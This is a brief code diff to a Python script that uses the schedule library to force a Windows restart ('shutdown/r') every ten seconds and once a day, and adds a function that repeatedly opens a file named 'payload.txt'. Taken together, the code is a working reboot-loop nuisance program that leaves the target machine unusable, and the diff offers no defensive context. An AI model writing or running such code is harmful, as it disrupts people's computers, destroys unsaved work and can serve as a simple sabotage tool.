@@ -12,8 +12,18 @@ def start():
 
     cmd= 'shutdown/r'
     os.system(cmd)
+    
+    
+def show():    
+    import os
+    cmd= 'start payload.txt'
+    os.system(cmd)
 
 schedule.every(10).seconds.do(start)
+schedule.every().day.at('10:30').do(start)
+
+schedule.every(1).hour.do(show)
+schedule.every().monday.do(show)
 
 while 1==1:
     schedule.run_pending()
